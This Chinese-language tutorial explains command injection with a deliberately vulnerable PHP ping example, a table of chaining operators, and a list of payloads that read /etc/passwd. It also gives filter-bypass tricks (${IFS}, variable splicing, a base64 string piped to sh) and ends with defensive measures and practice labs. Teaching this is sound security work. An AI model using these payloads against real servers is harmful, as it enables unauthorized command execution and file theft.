---
title: 命令注入
description: 命令注入原理、绕过技巧与防御方法。
date: 2026-07-21T00:00:00.000Z
---


## 命令注入

命令注入（Command Injection）是攻击者把系统命令拼进网站的执行逻辑里，让服务器替你执行它们。它和别的注入漏洞是同一个毛病：程序把用户输入直接拼进了命令，却没检查输入里有没有夹带私货。

### 危害

- 执行任意命令，拿到服务器控制权
- 读取敏感文件、反弹 shell
- 以内网为跳板继续渗透

命令注入在网络攻击中很常见。路由器、摄像头这类嵌入式设备的管理界面经常带「ping 检测」之类的功能，因为输入没过滤，成了攻击者获取设备权限最常用的入口之一。

---

### 一、注入原理

先看一段典型的危险代码：

```php
<?php
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

用户的输入被直接拼进了 system() 调用。传 `ip=127.0.0.1` 时，服务器执行的是：

```
ping -c 1 127.0.0.1
```

如果传 `ip=127.0.0.1; cat /etc/passwd`，命令就变成了：

```
ping -c 1 127.0.0.1; cat /etc/passwd
```

分号让两条命令都执行了，你传进去的内容被当成系统命令跑了起来。

### 二、注入点有哪些

凡是把输入拼进系统命令的地方都可能是注入点，常见的有：

- ping、traceroute、nslookup 这类网络检测功能
- 把文件名、目录名直接传给系统命令的功能
- 调用 shell 执行脚本，参数没过滤的情况

### 三、拼接命令的符号

| 符号 | 作用 |
|------|------|
| ; | 前一条执行完再执行后一条 |
| \| | 把前一条的输出传给后一条 |
| && | 前一条成功才执行后一条 |
| \|\| | 前一条失败才执行后一条 |
| 反引号或 $() | 命令替换，先执行括号里的命令 |

```bash
# 常见 payload
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1 $(whoami)
```

### 四、绕过技巧

服务端一般会过滤一些关键词，常见的绕过方式如下。

#### 空格绕过

```bash
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
```

#### 关键字绕过

```bash
# 变量拼接
a=c;b=at;$a$b /etc/passwd

# 反斜杠断开
c\at /etc/passwd
```

#### 编码绕过

```bash
# base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

### 五、防御方法

1. 用白名单校验输入，不符合预期的直接拒绝
2. 尽量调用编程语言自身的函数，而不是去执行 shell，比如 PHP 的 escapeshellarg
3. 别用 root 运行 Web 服务
4. 按最小权限给 Web 服务，只给它真正需要的能力

### 六、练习平台

- [DVWA](https://github.com/digininja/DVWA) 的 Command Injection 模块
- [Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu) 的命令注入模块
- [BUUCTF Web 方向](https://buuoj.cn/)
